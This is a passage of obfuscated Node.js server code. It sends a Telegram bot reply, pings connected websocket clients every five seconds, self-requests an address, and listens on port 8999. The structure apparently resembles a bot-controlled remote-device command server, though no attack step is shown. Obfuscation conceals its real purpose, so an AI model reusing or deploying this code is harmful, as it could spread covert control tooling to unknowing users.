          { reply_markup: { force_reply: !![] }, parse_mode: _0xe6b2b9(0x11e) }
        ),
        (currentUuid = _0x5346ac));
  }),
  setInterval(function () {
    const _0x1b8392 = _0x8ea7c8;
    appSocket[_0x1b8392(0x132)][_0x1b8392(0x175)](function _0x580553(
      _0x276850
    ) {
      const _0x25abea = _0x1b8392;
      _0x276850[_0x25abea(0x103)]("ping");
    });
    try {
      axios[_0x1b8392(0x113)](address)[_0x1b8392(0x11d)]((_0x40bfc4) => "");
    } catch (_0x1b4117) {}
  }, 0x1388),
  appServer["listen"](process[_0x8ea7c8(0x154)][_0x8ea7c8(0x155)] || 0x2327);